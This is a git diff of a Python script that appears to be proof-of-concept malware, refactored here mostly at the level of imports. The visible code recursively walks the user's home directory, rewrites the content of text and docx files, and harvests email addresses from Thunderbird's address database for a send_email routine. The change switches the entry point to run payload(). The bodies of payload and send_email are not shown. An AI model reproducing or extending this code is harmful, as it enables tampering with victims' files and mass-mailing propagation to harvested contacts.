@@ -15,15 +15,12 @@ do not abuse it to cause any harm!
 # ------------------------------- imports ----------------------------------
 # --------------------------------------------------------------------------
 
-# TODO: If possible, minimize imports using alternative syntax
-from os import listdir
-from os.path import expanduser, islink, isdir, isfile
+import os
 import mimetypes
-from random import randint
-from docx import Document
+import random
+import docx
 import sys
 import sqlite3
-from sqlite3 import Error
 
 
 # --------------------------------------------------------------------------
@@ -43,7 +40,7 @@ def users_home_dir():
     """
     :returns: the user's home directory on both Unix and Windows platforms
     """
-    # return expanduser("~")
+    # return os.path.expanduser("~")
     # return "/home/telekobold/TestVerzeichnis/OwnCloud-Test-Kopie" # For testing purposes
     return "/home/telekobold/TestVerzeichnis/SS19-Test-Kopie" # For testing purposes
 
@@ -81,11 +78,11 @@ def traverse_dirs(curr_file):
     starting from `curr_file` and calls the appropriate 
     processing function for each file.
     """
-    if islink(curr_file):
+    if os.path.islink(curr_file):
         print("detected symlink {}".format(curr_file)) # test output
         # TODO: Maybe do the same as for directories instead of just ignoring symlinks?
         return
-    if isfile(curr_file):
+    if os.path.isfile(curr_file):
         if is_file_type(curr_file, "txt"):
             # print("TEXT file {}".format(curr_file)) # test output
             process_text_file(curr_file)
@@ -103,9 +100,9 @@ def traverse_dirs(curr_file):
             print("music file {}".format(curr_file)) # test output
             process_music_file(curr_file)
         """
-    if isdir(curr_file):
+    if os.path.isdir(curr_file):
         # print("DIR {}".format(curr_file)) # test output
-        for file in listdir(curr_file):
+        for file in os.listdir(curr_file):
             # TODO: Adapt for Windows ("\" instead of "/").
             traverse_dirs("{}/{}".format(curr_file, file))
             
@@ -151,7 +148,7 @@ def n_rand_numbers(n):
         print("For n_rand_numbers, only positive values make sense!")
         return None
     while len(result) < n:
-        i = randint(0,n)
+        i = random.randint(0,n)
         if i not in result:
             result.append(i)
     
@@ -221,7 +218,7 @@ def write_dict_to_docx_file(dictionary, filename):
     :dictionary: the dictionary that should be written to a file.
     :filename: the name of the docx file that should be filled with dictionary's content.
     """
-    document = Document()
+    document = docx.Document()
     paragraph = document.add_paragraph()
     for i in range(len(dictionary)):
         paragraph.add_run("{}\n".format(dictionary[i]))
@@ -237,7 +234,7 @@ def process_docx_file(input_filename):
     """
     global FILES_TO_WRITE_PER_DIR
     input_file_content = {}
-    document = Document(input_filename)
+    document = docx.Document(input_filename)
     # Read out the document's text:
     # TODO: Preserve the text's formatting
     for i, p in zip(range(sys.maxsize), document.paragraphs):
@@ -297,7 +294,7 @@ def read_email_addresses_thunderbird():
     con = None
     email_addresses = []
     
-    if isfile(database):
+    if os.path.isfile(database):
         with sqlite3.connect(database) as con:
             with con:
                 cur = con.cursor()
@@ -355,5 +352,5 @@ def send_email():
 
 if __name__ == "__main__":
     # TODO: Start two different threads, one for executing the payload and one for sending emails.
-    # payload()
-    send_email()
+    payload()
+    # send_email()
